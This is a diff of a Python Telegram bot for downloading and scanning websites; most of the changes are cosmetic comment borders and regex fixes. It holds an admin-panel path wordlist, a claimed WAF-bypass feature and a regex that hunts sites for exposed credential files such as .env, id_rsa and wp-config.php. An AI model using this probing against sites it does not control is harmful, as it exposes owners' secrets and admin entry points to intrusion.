@@ -1,18 +1,18 @@
 #!/usr/bin/env python3
-# +==============================================================+
-# |  Website Downloader Bot  v43.0    POWERFUL IMPROVE         |
-# |  ✅ Thread Safety + Memory Monitor + Per-User Quotas        |
-# | ---------------- v45 Fixed for v20.8 ---------------------- |
-# |  🛡️ Ultimate Bypass Engine (403/WAF Bypass)                |
-# |  ⚡ High-Performance Async Core (Shared Session)            |
-# |  📊 Markdown Table Reports (Clean UI)                       |
-# |  🧠 False Positive Filtering (Accurate Results)             |
-# |  🔄 Global Auto-Retry with Exponential Backoff              |
-# |  🚀 NEW: /api   Enhanced Admin Panel Finder                 |
-# |  ⏱️ Dynamic Timeout Handling for Heavy Sites                |
-# |  📝 Structured JSON logging for Railway dashboard           |
-# |  🎯 Better error messages (quota, timeout, system busy)     |
-# +==============================================================+
+# ╔══════════════════════════════════════════════════════════════╗
+# ║  Website Downloader Bot  v43.0  — POWERFUL IMPROVE         ║
+# ║  ✅ Thread Safety + Memory Monitor + Per-User Quotas        ║
+# ║ ──────────────── v45 Fixed for v20.8 ────────────────────── ║
+# ║  🛡️ Ultimate Bypass Engine (403/WAF Bypass)                ║
+# ║  ⚡ High-Performance Async Core (Shared Session)            ║
+# ║  📊 Markdown Table Reports (Clean UI)                       ║
+# ║  🧠 False Positive Filtering (Accurate Results)             ║
+# ║  🔄 Global Auto-Retry with Exponential Backoff              ║
+# ║  🚀 NEW: /api — Enhanced Admin Panel Finder                 ║
+# ║  ⏱️ Dynamic Timeout Handling for Heavy Sites                ║
+# ║  📝 Structured JSON logging for Railway dashboard           ║
+# ║  🎯 Better error messages (quota, timeout, system busy)     ║
+# ╚══════════════════════════════════════════════════════════════╝
 
 import os, re, json, time, shutil, zipfile, hashlib, hmac, string, struct, tempfile, threading
 import logging, asyncio, subprocess, socket, random, difflib, functools, io
@@ -28,7 +28,7 @@ from datetime import datetime, date, timedelta
 from ipaddress import ip_address, ip_network, AddressValueError
 from urllib.parse import urljoin, urlparse
 from functools import lru_cache
-import sqlite3                                   # SQLite   built-in, no extra install
+import sqlite3                                   # SQLite — built-in, no extra install
 import requests
 import aiohttp
 import aiofiles
@@ -45,44 +45,44 @@ from telegram.ext import (
 from telegram.error import BadRequest, RetryAfter, TimedOut, NetworkError, Conflict
 from telegram.request import HTTPXRequest
 
-# -- Memory monitoring (optional: pip install psutil) ---------
+# ── Memory monitoring (optional: pip install psutil) ─────────
 try:
     import psutil
     HAS_PSUTIL = True
 except ImportError:
     HAS_PSUTIL = False
     logger = logging.getLogger(__name__)
-    logger.warning("psutil not installed   memory monitor disabled. Run: pip install psutil --break-system-packages")
+    logger.warning("psutil not installed — memory monitor disabled. Run: pip install psutil --break-system-packages")
 
-# -- dotenv (optional but recommended) ------------
+# ── dotenv (optional but recommended) ────────────
 try:
     from dotenv import load_dotenv
     load_dotenv()
 except ImportError:
     pass  # pip install python-dotenv မလုပ်ရသေးရင် skip
 
-# ==================================================
-# ⚙️  CONFIG     .env မှ ယူသည် (fallback: hardcode)
-# ==================================================
+# ══════════════════════════════════════════════════
+# ⚙️  CONFIG  —  .env မှ ယူသည် (fallback: hardcode)
+# ══════════════════════════════════════════════════
 BOT_TOKEN = os.getenv("BOT_TOKEN", "")  # Set in Railway environment variables
 ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()]
 
 
-# -- Startup validation --------------------------------------------------
+# ── Startup validation ──────────────────────────────────────────────────
 if not BOT_TOKEN:
     raise SystemExit("❌ BOT_TOKEN not set! Add it to Railway environment variables.")
 if not ADMIN_IDS:
     raise SystemExit("❌ ADMIN_IDS not set! Add your Telegram user ID to Railway environment variables.")
 
-# -- DATA_DIR: persistent storage root ----------------------------------
+# ── DATA_DIR: persistent storage root ──────────────────────────────────
 # Railway: mount a volume at /app/data for persistence across deploys
-# Without a volume, /app/data is ephemeral (wiped on redeploy)   still works fine
+# Without a volume, /app/data is ephemeral (wiped on redeploy) — still works fine
 DATA_DIR = os.getenv("DATA_DIR", "/app/data")
 os.makedirs(DATA_DIR, exist_ok=True)
 
-# -- SECRET_KEY: persistent across restarts (HMAC resume state integrity) --
+# ── SECRET_KEY: persistent across restarts (HMAC resume state integrity) ──
 # Bug fix: os.urandom() ကို တိုင်းသုံးရင် restart တိုင်း key ပြောင်းသွားတယ်
-# Fix: file ထဲ save ထားပြီး ဖတ်သုံးတယ်   resume HMAC ကို stable ဖြစ်စေသည်
+# Fix: file ထဲ save ထားပြီး ဖတ်သုံးတယ် — resume HMAC ကို stable ဖြစ်စေသည်
 # Railway: SECRET_KEY env var set ထားရင် file မလိုဘဲ directly သုံးသည်
 _SECRET_KEY_FILE = os.path.join(DATA_DIR, "secret.key")
 
@@ -129,22 +129,22 @@ TIMEOUT_WARN          = int(os.getenv("TIMEOUT_WARN", "50"))
 SPLIT_MB              = 45
 MAX_ASSET_MB          = 500   # Support larger asset downloads
 RATE_LIMIT_SEC        = 5     # Reduced cooldown for faster usage
-HEAVY_RATE_LIMIT_SEC  = 0     # removed cooldown   queue system handles concurrency
+HEAVY_RATE_LIMIT_SEC  = 0     # removed cooldown — queue system handles concurrency
 QUEUE_MAX_PER_USER    = 5     # More parallel slots per user
 NUM_QUEUE_WORKERS     = int(os.getenv("NUM_QUEUE_WORKERS", "8"))   # More parallel queue workers
 
-# -- Per-user quota system --------------------------------------
+# ── Per-user quota system ──────────────────────────────────────
 DAILY_LIMIT_PER_USER_DL = int(os.getenv("DAILY_LIMIT_PER_USER_DL", "5"))   # downloads per user
 DAILY_LIMIT_PER_USER_SCAN = int(os.getenv("DAILY_LIMIT_PER_USER_SCAN", "10")) # scans per user
 MAX_CONCURRENT_PER_USER = int(os.getenv("MAX_CONCURRENT_PER_USER", "2"))     # parallel jobs per user
 
-# -- Memory monitoring (Railway $20 = 8GB) ----------------------
+# ── Memory monitoring (Railway $20 = 8GB) ──────────────────────
 MAX_BOT_MEMORY_MB = int(os.getenv("MAX_BOT_MEMORY_MB", "6000"))  # Leave 2GB buffer on 8GB system
 MEMORY_CHECK_INTERVAL = int(os.getenv("MEMORY_CHECK_INTERVAL", "30"))  # seconds
 
-# ==================================================
-# 🌀  ANIMATED LOADING    Spinner frames for live UX
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🌀  ANIMATED LOADING  — Spinner frames for live UX
+# ══════════════════════════════════════════════════
 SPINNER_BRAILLE = ["⣾","⣽","⣻","⢿","⡿","⣟","⣯","⣷"]
 SPINNER_ARROW   = ["▹▹▹▹▹","▸▹▹▹▹","▹▸▹▹▹","▹▹▸▹▹","▹▹▹▸▹","▹▹▹▹▸"]
 SPINNER_DOTS    = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
@@ -212,13 +212,13 @@ async def _animated_spinner_task(
     frames = spin_frames or SPINNER_BRAILLE
     idx = 0
     while True:
-        # ✅ Sleep is cancellable   CancelledError propagates cleanly
+        # ✅ Sleep is cancellable — CancelledError propagates cleanly
         try:
             await asyncio.sleep(interval)
         except asyncio.CancelledError:
             return
 
-        # Safely get text   don't let a bad callback crash the spinner
+        # Safely get text — don't let a bad callback crash the spinner
         try:
             body = get_text_fn() if callable(get_text_fn) else get_text_fn
         except Exception:
@@ -233,7 +233,7 @@ async def _animated_spinner_task(
         except asyncio.CancelledError:
             return   # ✅ Propagate cancellation from edit_text await
         except RetryAfter as e:
-            # FloodWait   respect Telegram's rate limit
+            # FloodWait — respect Telegram's rate limit
             try:
                 await asyncio.sleep(getattr(e, 'retry_after', 5) + 1)
             except asyncio.CancelledError:
@@ -245,11 +245,11 @@ async def _animated_spinner_task(
                 'message to edit not found',
                 'there is no text in the message',
             )):
-                return   # Message deleted or unchanged   stop silently
-            # Other transient errors (NetworkError etc.)   skip this tick
+                return   # Message deleted or unchanged — stop silently
+            # Other transient errors (NetworkError etc.) — skip this tick
         idx += 1
 
-# ==================================================
+# ══════════════════════════════════════════════════
 
 logging.basicConfig(
     format='%(asctime)s - %(levelname)s - %(message)s',
@@ -257,9 +257,9 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # 📊 STRUCTURED LOGGING for Railway Dashboard
-# ==================================================
+# ══════════════════════════════════════════════════
 def log_event(event_type: str, user_id: int, status: str, details: dict = None):
     """Log structured JSON event for Railway dashboard visibility"""
     event = {
@@ -271,9 +271,9 @@ def log_event(event_type: str, user_id: int, status: str, details: dict = None):
     }
     logger.info(json.dumps(event))
 
-# ==================================================
-# 🔒 THREAD-SAFE DICT WRAPPERS   For global state
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🔒 THREAD-SAFE DICT WRAPPERS — For global state
+# ══════════════════════════════════════════════════
 class ThreadSafeDict:
     """Thread-safe dictionary wrapper with explicit locking"""
     def __init__(self):
@@ -324,9 +324,9 @@ class ThreadSafeDict:
         with self._lock:
             return len(self._data)
 
-# ==================================================
-# 💾 MEMORY MONITOR   Graceful degradation at 80% RAM
-# ==================================================
+# ══════════════════════════════════════════════════
+# 💾 MEMORY MONITOR — Graceful degradation at 80% RAM
+# ══════════════════════════════════════════════════
 _system_memory_stressed = False
 
 def check_memory_usage() -> bool:
@@ -346,12 +346,12 @@ def check_memory_usage() -> bool:
         logger.debug(f"Memory check error: {e}")
         return False
 
-# ==================================================
+# ══════════════════════════════════════════════════
 
-# ⚡  ENTERPRISE SESSION POOL    Global, thread-safe
+# ⚡  ENTERPRISE SESSION POOL  — Global, thread-safe
 #     Single pool shared across all sync functions
 #     Prevents memory leaks from per-call Session()
-# ==================================================
+# ══════════════════════════════════════════════════
 
 _SESSION_LOCK   = threading.Lock()
 _SESSION_POOL: dict = {}   # {thread_id: requests.Session}
@@ -390,11 +390,11 @@ def _get_pooled_session(*, verify_ssl: bool = True, extra_headers: dict = None) 
             sess.mount("https://", adapter)
             sess.verify = verify_ssl
             _SESSION_POOL[key] = sess
-        # -- Thread-safe: return session; caller merges extra_headers per-request --
+        # ── Thread-safe: return session; caller merges extra_headers per-request ──
         return sess
 
 def _reset_session_pool():
-    """Close all pooled sessions - called on shutdown."""
+    """Close all pooled sessions — called on shutdown."""
     with _SESSION_LOCK:
         for s in _SESSION_POOL.values():
             try: s.close()
@@ -402,10 +402,10 @@ def _reset_session_pool():
         _SESSION_POOL.clear()
 
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # ⚡  EXPONENTIAL BACKOFF DECORATOR
 #     Wraps any sync function that does network I/O
-# ==================================================
+# ══════════════════════════════════════════════════
 
 def with_exponential_backoff(max_retries: int = 3, base_delay: float = 1.0,
                               exceptions=(requests.exceptions.RequestException,
@@ -436,10 +436,10 @@ def with_exponential_backoff(max_retries: int = 3, base_delay: float = 1.0,
     return decorator
 
 
-# ==================================================
-# 🔌  CIRCUIT BREAKER    Auto-blocks repeatedly-failing hosts
+# ══════════════════════════════════════════════════
+# 🔌  CIRCUIT BREAKER  — Auto-blocks repeatedly-failing hosts
 #     Prevents thundering-herd on dead hosts under heavy load
-# ==================================================
+# ══════════════════════════════════════════════════
 
 class CircuitBreaker:
     """
@@ -497,10 +497,10 @@ class CircuitBreaker:
 _CIRCUIT_BREAKER = CircuitBreaker(fail_threshold=5, recovery_timeout=60.0)
 
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # 🗂️  IN-MEMORY LRU SCAN CACHE  (thread-safe)
 #     Prevents redundant identical scans within TTL
-# ==================================================
+# ══════════════════════════════════════════════════
 
 _SCAN_CACHE: dict = {}          # {key: (result, timestamp)}
 _SCAN_CACHE_LOCK = threading.Lock()
@@ -534,9 +534,9 @@ def _cache_cleanup():
         logger.debug("Scan cache cleanup: evicted %d expired entries", len(stale))
 
 
-# ==================================================
-# ⚡  MANAGED THREAD POOL    Singleton, lifecycle-safe
-# ==================================================
+# ══════════════════════════════════════════════════
+# ⚡  MANAGED THREAD POOL  — Singleton, lifecycle-safe
+# ══════════════════════════════════════════════════
 
 _GLOBAL_EXECUTOR: concurrent.futures.ThreadPoolExecutor | None = None
 _EXECUTOR_LOCK = threading.Lock()
@@ -552,7 +552,7 @@ def get_executor() -> concurrent.futures.ThreadPoolExecutor:
             )
         return _GLOBAL_EXECUTOR
 
-# -- File log with rotation (5MB × 3 files   disk ပြည့်မသွားဖို့) ---
+# ── File log with rotation (5MB × 3 files — disk ပြည့်မသွားဖို့) ───
 from logging.handlers import RotatingFileHandler
 _file_handler = RotatingFileHandler(
     os.path.join(DATA_DIR, "bot.log"),
@@ -567,26 +567,26 @@ for d in [DOWNLOAD_DIR, RESUME_DIR, APP_ANALYZE_DIR]:
     os.makedirs(d, exist_ok=True)
 
 download_semaphore: asyncio.Semaphore  # initialized in main()
-scan_semaphore:     asyncio.Semaphore  # initialized in main()   max concurrent heavy scans
-_active_scans: ThreadSafeDict = ThreadSafeDict()  # {uid: task_name}   track running scans for /stop (THREAD-SAFE)
-_scan_tasks:  ThreadSafeDict = ThreadSafeDict()   # {uid: asyncio.Task}   actual task refs for cancellation (THREAD-SAFE)
+scan_semaphore:     asyncio.Semaphore  # initialized in main() — max concurrent heavy scans
+_active_scans: ThreadSafeDict = ThreadSafeDict()  # {uid: task_name} — track running scans for /stop (THREAD-SAFE)
+_scan_tasks:  ThreadSafeDict = ThreadSafeDict()   # {uid: asyncio.Task} — actual task refs for cancellation (THREAD-SAFE)
 
-# -- Queue system ----------------------------------
+# ── Queue system ──────────────────────────────────
 QUEUE_MAX     = 20                    # max queue depth
 _dl_queue: asyncio.Queue | None = None  # initialized in main()
 _queue_pos: ThreadSafeDict = ThreadSafeDict()     # {uid: position} (THREAD-SAFE)
 _queue_counter: int = 0              # monotonic counter for accurate position
 
-# -- Auto-delete config ----------------------------
+# ── Auto-delete config ────────────────────────────
 FILE_EXPIRY_HOURS = int(os.getenv("FILE_EXPIRY_HOURS", "24"))   # 24h ကြာရင် auto-delete
 
-# -- Global locks / state --------------------------
+# ── Global locks / state ──────────────────────────
 db_lock: asyncio.Lock                      # initialized in main()
 user_last_req: ThreadSafeDict = ThreadSafeDict()        # rate limit tracker {uid: timestamp} (THREAD-SAFE)
 user_heavy_req: ThreadSafeDict = ThreadSafeDict()       # heavy scan rate limit {uid: timestamp} (THREAD-SAFE)
 user_queue_count: ThreadSafeDict = ThreadSafeDict()     # per-user queue slot counter {uid: int} (THREAD-SAFE)
 user_daily_quota: ThreadSafeDict = ThreadSafeDict()     # track daily quotas {uid: {date: count}} (THREAD-SAFE)
-_cancel_flags: ThreadSafeDict = ThreadSafeDict()        # {uid: asyncio.Event}   /stop signal (THREAD-SAFE)
+_cancel_flags: ThreadSafeDict = ThreadSafeDict()        # {uid: asyncio.Event} — /stop signal (THREAD-SAFE)
 
 HEADERS = {
     'User-Agent': (
@@ -596,7 +596,7 @@ HEADERS = {
     )
 }
 
-# -- v41: Admin Panel Finder Wordlist ------------------
+# ── v41: Admin Panel Finder Wordlist ──────────────────
 _ADMIN_PATHS = [
     # New Admin Paths
     '/admin/login', '/admin/dashboard', '/admin/home', '/admin/index.php',
@@ -686,7 +686,7 @@ _ADMIN_PATHS = [
     '/adm', '/admlogin', '/adm_auth', '/memberadmin', '/superadmin',
 ]
 
-# -- Puppeteer check -------------------------------
+# ── Puppeteer check ───────────────────────────────
 def _check_puppeteer() -> bool:
     script_dir = os.path.dirname(os.path.abspath(__file__))
     return (
@@ -697,19 +697,19 @@ def _check_puppeteer() -> bool:
 
 PUPPETEER_OK = _check_puppeteer()
 
-# -- HTML parser   lxml 3-5× faster than html.parser --
+# ── HTML parser — lxml 3-5× faster than html.parser ──
 try:
     import lxml  # noqa
     _BS_PARSER = 'lxml'
 except ImportError:
     _BS_PARSER = 'html.parser'
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # ⚡  PRE-COMPILED REGEX PATTERNS (module-level)
-# ==================================================
+# ══════════════════════════════════════════════════
 
 _RE_URL_IN_HTML = re.compile(
-    r"""["'`]((https?://|/)[^"'`<>\s]+\.(js|css|woff2?|ttf|otf|eot"""
+    r"""["\x27`]((https?://|/)[^"\x27`<>\s]+\.(js|css|woff2?|ttf|otf|eot"""
     r"""|png|jpg|jpeg|gif|svg|webp|avif|ico"""
     r"""|mp4|webm|mp3|ogg|wav|wasm"""
     r"""|pdf|zip|apk|json|xml|yaml|yml|sql|env|bak|config|txt|md"""
@@ -717,12 +717,13 @@ _RE_URL_IN_HTML = re.compile(
     r"""|tar|gz|7z|rar|dmg|pkg|bin|exe|msi|deb|rpm"""
     r"""|map|ts|tsx|jsx|vue|svelte|less|scss|sass|styl"""
     r"""|wasm|manifest|webmanifest|appcache|worker|sw|service-worker"""
+    r"""|apk|ipa|xap|appx|appxbundle|msix|msixbundle"""
     r"""|doc|docx|xls|xlsx|ppt|pptx|odt|ods|odp|rtf|csv|tsv"""
     r"""|mp4|webm|mkv|avi|mov|wmv|flv|m4v|3gp|3g2"""
     r"""|mp3|wav|ogg|flac|aac|m4a|wma|mid|midi|opus"""
-    r"""|woff|woff2|ttf|otf|eot|svg|bmp|tiff|psd|ai|eps|raw|heif|heic"""
-    r"""|png|jpg|jpeg|gif|webp|avif|ico"""
-    r""")(\?[^"'`<>\s]*)?)["'`]""",
+    r"""|woff|woff2|ttf|otf|eot|svg|afm|pfb|pfa|pcf|fnt|fon|dfont|ttc"""
+    r"""|png|jpg|jpeg|gif|svg|webp|avif|ico|bmp|tiff|psd|ai|eps|indd|raw|heif|heic"""
+    r""")(\?[^"\x27`<>\s]*)?)[\"'`]""",
     re.IGNORECASE
 )
 
@@ -731,25 +732,25 @@ _RE_API_ENDPOINT = re.compile(r'/(?:api|v[0-9]|rest|graphql|v1|v2|v3|v4|v5|v6|v7
 _RE_CLOUD_BUCKET = re.compile(r'(?:[a-z0-9\.\-]+\.(?:s3(?:-external-1)?|s3-w-a\.amazonaws\.com|s3\.[a-z0-9\-]+\.amazonaws\.com|storage\.googleapis\.com|blob\.core\.windows\.net|digitaloceanspaces\.com|backblazeb2\.com|wasabisys\.com|linodeobjects\.com|cloudflare\.com/cdn-cgi/image|cloudinary\.com|imgix\.net|fastly\.net|akamaihd\.net|edgecastcdn\.net|cloudfront\.net))', re.IGNORECASE)
 _RE_HIDDEN_FILES = re.compile(r'/(?:\.env|\.git|\.svn|\.hg|\.bzr|\.DS_Store|\.htaccess|\.htpasswd|\.ssh|\.bash_history|\.mysql_history|\.dockerignore|\.dockerconfigjson|docker-compose\.yml|package-lock\.json|pnpm-lock\.yaml|yarn\.lock|composer\.lock|requirements\.txt|Gemfile\.lock|Makefile|Dockerfile|config\.php|wp-config\.php|web\.config|settings\.py|local_settings\.py|database\.yml|secrets\.yml|credentials\.yml|id_rsa|id_dsa|id_ecdsa|id_ed25519|authorized_keys|known_hosts)', re.IGNORECASE)
 
-# v35: Fixed CSS url() regex   old version matched data: URIs and failed on unquoted
+# v35: Fixed CSS url() regex — old version matched data: URIs and failed on unquoted
 _RE_CSS_URL     = re.compile(r'''url\(\s*(?:"|')?([^)"'\s]+)(?:"|')?\s*\)''', re.IGNORECASE)
 _RE_CSS_IMPORT  = re.compile(r'''@import\s+(?:url\()?(?:"|')?([^)"'\s;]+)(?:"|')?\)?''', re.IGNORECASE)
 _RE_CSS_FONT    = re.compile(r'''@font-face\s*\{[^}]*src\s*:[^}]*url\(([^)]+)\)''', re.DOTALL | re.IGNORECASE)
 _RE_JSONLD_IMG  = re.compile(r'"(https?://[^"]{8,}\.(?:jpg|jpeg|png|webp|gif|svg|avif))"', re.IGNORECASE)
 _RE_JS_FULL_URL = re.compile(
-    r'(https?://[^"\x27<>\s]{8,}\.(?:js|css|woff2?|ttf|otf|eot|png|jpg|jpeg|gif|webp|avif|svg|mp4|webm|mp3|pdf|wasm))',
+    r'''["`'](https?://[^"`'<>\s]{8,}\.(?:js|css|woff2?|ttf|otf|eot|png|jpg|jpeg|gif|webp|avif|svg|mp4|webm|mp3|pdf|wasm))["`']''',
     re.IGNORECASE
 )
 _RE_JS_REL_URL  = re.compile(
-    r'(/[^"\x27<>\s]{3,}\.(?:js|css|woff2?|ttf|otf|eot|png|jpg|jpeg|gif|webp|avif|svg|mp4|webm|mp3|pdf|wasm))',
+    r'''["`'](/[^"`'<>\s]{3,}\.(?:js|css|woff2?|ttf|otf|eot|png|jpg|jpeg|gif|webp|avif|svg|mp4|webm|mp3|pdf|wasm))["`']''',
     re.IGNORECASE
 )
 _RE_SITEMAP_LOC = re.compile(r'<loc>\s*(https?://[^<]+)\s*</loc>')
 _RE_ROBOTS_SM   = re.compile(r'(?i)sitemap:\s*(https?://\S+)')
 # v35 new patterns for enhanced asset extraction
-_RE_NEXT_CHUNK  = re.compile(r'/_next/static/[^\s"\x27<>]+')
-_RE_WEBPACK_CHUNK = re.compile(r'([a-f0-9]{8,20}\.[a-z0-9]+\.(?:js|css))')
-_RE_WEBPACK_PUBLIC = re.compile(r'__webpack_public_path__\s*=\s*[^\s"\x27](.*?)[^\s"\x27]|publicPath\s*:\s*[^\s"\x27](.*?)[^\s"\x27]')
+_RE_NEXT_CHUNK  = re.compile(r"/_next/static/[^\s<>]+")
+_RE_WEBPACK_CHUNK = re.compile(r"""["\x27`]([a-f0-9]{8,20}\.[a-z0-9]+\.(?:js|css))["\x27`]""")
+_RE_WEBPACK_PUBLIC = re.compile(r"""__webpack_public_path__\s*=\s*["\x27`](.*?)["\x27`]|publicPath\s*:\s*["\x27`](.*?)["\x27`]""")
 _RE_SRCSET_PART = re.compile(r'([^\s,]+)(?:\s+(?:\d+(?:\.\d+)?[wx]))?')
 _RE_SW_REGISTER = re.compile(r'''navigator\.serviceWorker\.register\s*\(\s*["`']([^`'"]+)["`']''')
 _RE_WIN_STATE   = re.compile(r'''window\.__(?:INITIAL_STATE|PRELOADED_STATE|NEXT_DATA|NUXT__)__\s*=\s*(\{.{20,5000}?\})''', re.DOTALL)
@@ -757,9 +758,9 @@ _RE_WIN_STATE   = re.compile(r'''window\.__(?:INITIAL_STATE|PRELOADED_STATE|NEXT
 _RE_SRI_HASH       = re.compile(r'^sha(?:256|384|512)-[A-Za-z0-9+/=]{20,}$')
 _RE_CSS_URL_SAFE   = re.compile(r'''url\(\s*(?:"([^"]+)"|'([^']+)'|([^)"'\s]+))\s*\)''', re.IGNORECASE)
 _RE_CSS_FONT_MULTI = re.compile(r'''url\(\s*(?:"([^"]+)"|'([^']+)'|([^)"'\s]+))\s*\)(?:[^;]*format\([^)]+\))?''', re.IGNORECASE | re.DOTALL)
-_RE_VITE_ASSET     = re.compile(r'(/assets/[^"\x27<>\s]+\.(?:js|css|woff2?|ttf|otf|eot|png|jpg|jpeg|gif|svg|webp|avif|mp4|webm|mp3|pdf|wasm))', re.IGNORECASE)
-_RE_PROTO_REL_URL  = re.compile(r'(//[a-zA-Z0-9][^"\x27<>\s]{4,})')
-# Lazy-load attributes for <img>   extended for modern frameworks
+_RE_VITE_ASSET     = re.compile(r'''["\x27`](/assets/[^"\x27`<>\s]+\.(?:js|css|woff2?|ttf|otf|eot|png|jpg|jpeg|gif|svg|webp|avif|mp4|webm|mp3|pdf|wasm))["\x27`]''', re.IGNORECASE)
+_RE_PROTO_REL_URL  = re.compile(r"""["\x27`](//[a-zA-Z0-9][^"\x27`<>\s]{4,})["\x27`]""")
+# Lazy-load attributes for <img> — extended for modern frameworks
 _LAZY_LOAD_ATTRS = (
     'src', 'data-src', 'data-lazy', 'data-original', 'data-lazy-src',
     'data-srcset', 'data-original-src', 'data-hi-res-src',
@@ -769,9 +770,9 @@ _LAZY_LOAD_ATTRS = (
 )
 
 
-# ==================================================
-# 🔒  SECURITY LAYER 1   SSRF Protection
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🔒  SECURITY LAYER 1 — SSRF Protection
+# ══════════════════════════════════════════════════
 
 _BLOCKED_NETS = [
     ip_network("127.0.0.0/8"),
@@ -788,7 +789,7 @@ _BLOCKED_NETS = [
 
 @lru_cache(maxsize=512)
 def _resolve_hostname(hostname: str) -> str:
-    """DNS resolution with LRU cache - avoids repeated lookups for same host."""
+    """DNS resolution with LRU cache — avoids repeated lookups for same host."""
     return socket.gethostbyname(hostname)
 
 def _is_safe_ip(ip_str: str) -> bool:
@@ -827,7 +828,7 @@ def is_safe_url(url: str) -> tuple:
     if '\x00' in url or '%00' in url:
         return False, "Null byte detected"
 
-    # URL format   allowed chars only
+    # URL format — allowed chars only
     if not re.match(r'^https?://[^\s<>"{}|\\^`\[\]]+$', url):
         return False, "Invalid characters in URL"
 
@@ -842,9 +843,9 @@ def is_safe_url(url: str) -> tuple:
     return True, "OK"
 
 
-# ==================================================
-# 🔒  SECURITY LAYER 2   Path Traversal Protection
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🔒  SECURITY LAYER 2 — Path Traversal Protection
+# ══════════════════════════════════════════════════
 
 def safe_local_path(domain_dir: str, url: str) -> str:
     """
@@ -865,7 +866,7 @@ def safe_local_path(domain_dir: str, url: str) -> str:
         base, ext = os.path.splitext(path)
         path = f"{base}_{sq}{ext}"
 
-    # -- Path traversal check ----------------------
+    # ── Path traversal check ──────────────────────
     local = os.path.normpath(os.path.join(domain_dir, path))
     real_domain = os.path.realpath(domain_dir)
     real_local  = os.path.realpath(os.path.join(domain_dir, path))
@@ -881,13 +882,13 @@ def safe_local_path(domain_dir: str, url: str) -> str:
     return local
 
 
-# ==================================================
-# 🔒  SECURITY LAYER 3   Rate Limiting
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🔒  SECURITY LAYER 3 — Rate Limiting
+# ══════════════════════════════════════════════════
 
 class _TokenBucket:
     """
-    Token Bucket rate limiter   O(1) per check, thread-safe.
+    Token Bucket rate limiter — O(1) per check, thread-safe.
 
     v36 improvements:
     - Idle eviction: 1h (was 2h) to save memory on busy bots
@@ -954,7 +955,7 @@ def check_rate_limit(user_id: int, heavy: bool = False) -> tuple:
     BUG NOTE (v35 fix preserved):
     Old code had: return allowed, int(wait)+1 if not allowed else (True, 0)
     Python parsed this as tuple-in-tuple when allowed=True.
-    Fix: explicit if/else blocks   no inline ternary.
+    Fix: explicit if/else blocks — no inline ternary.
     """
     import math
     # System/internal calls bypass rate limiting
@@ -998,7 +999,7 @@ def check_user_quota(user_id: int, action_type: str = "download") -> tuple:
         action_name = "scans"
     
     if today_count >= limit:
-        return False, 0, f"❌ *Daily quota exceeded*   `{today_count}/{limit} {action_name}` used today. Try tomorrow!"
+        return False, 0, f"❌ *Daily quota exceeded* — `{today_count}/{limit} {action_name}` used today. Try tomorrow!"
     
     remaining = limit - today_count - 1
     return True, remaining, f"✅ `{remaining} {action_name}` remaining today"
@@ -1013,17 +1014,17 @@ def increment_user_quota(user_id: int, action_type: str = "download"):
     user_daily_quota.set(user_id, user_quota)
 
 
-# ==================================================
-# 🌐  PROXY MANAGER    Rotation + Health + Failover
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🌐  PROXY MANAGER  — Rotation + Health + Failover
+# ══════════════════════════════════════════════════
 
-# ==================================================
-# 🔒  SECURITY LAYER 4   Log Sanitization
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🔒  SECURITY LAYER 4 — Log Sanitization
+# ══════════════════════════════════════════════════
 
 async def safe_edit(msg, text: str, **kwargs) -> bool:
     """
-    Edit a Telegram message safely   Message or CallbackQuery support.
+    Edit a Telegram message safely — Message or CallbackQuery support.
 
     BUG FIX v35:
     - RetryAfter (FloodWait) now handled with sleep + one retry
@@ -1062,10 +1063,10 @@ async def safe_edit(msg, text: str, **kwargs) -> bool:
                 "message can't be deleted",
             )):
                 return True
-            # Parse entity error   retry without parse_mode
+            # Parse entity error — retry without parse_mode
             if "can't parse entities" in err and 'parse_mode' in kwargs and attempt == 0:
                 kwargs_plain = {k: v for k, v in kwargs.items() if k != 'parse_mode'}
-                safe_text = re.sub(r"""[*_`\[\]]""", '', text)
+                safe_text = re.sub(r'[*_`\[\]]', '', text)
                 try:
                     if hasattr(msg, 'edit_message_text'):
                         await msg.edit_message_text(safe_text, **kwargs_plain)
@@ -1106,13 +1107,13 @@ def log_warn(url: str, extra: str = ""):
     logger.warning(f"{safe_url} {extra}")
 
 
-# ==================================================
-# 🔒  SECURITY LAYER 5   Admin Auth Hardened
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🔒  SECURITY LAYER 5 — Admin Auth Hardened
+# ══════════════════════════════════════════════════
 
 async def verify_admin(update: Update) -> bool:
     """
-    Admin verification   multi-layer check
+    Admin verification — multi-layer check
     """
     uid = update.effective_user.id
 
@@ -1143,23 +1144,23 @@ def admin_only(func):
     @functools.wraps(func)
     async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not await verify_admin(update):
-            # -- Admin command   user မြင်ရင်မကောင်းဘူး   silent ignore --
+            # ── Admin command — user မြင်ရင်မကောင်းဘူး — silent ignore ──
             return
         return await func(update, context)
     return wrapper
 
 
-# ==================================================
-# 🚨  ADMIN ERROR NOTIFY   Unhandled error → Admin DM
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🚨  ADMIN ERROR NOTIFY — Unhandled error → Admin DM
+# ══════════════════════════════════════════════════
 
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Global error handler - Admin ဆီ Telegram message ပို့မည်"""
+    """Global error handler — Admin ဆီ Telegram message ပို့မည်"""
     import traceback
 
     err = context.error
 
-    # -- Silently ignore non-critical Telegram API errors ----------
+    # ── Silently ignore non-critical Telegram API errors ──────────
     if isinstance(err, BadRequest):
         err_msg = str(err).lower()
         if any(s in err_msg for s in (
@@ -1176,7 +1177,7 @@ async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> N
         logger.warning("Network error (ignored in handler): %s", err)
         return
 
-    # -- Real errors → log + notify admin --------------------------
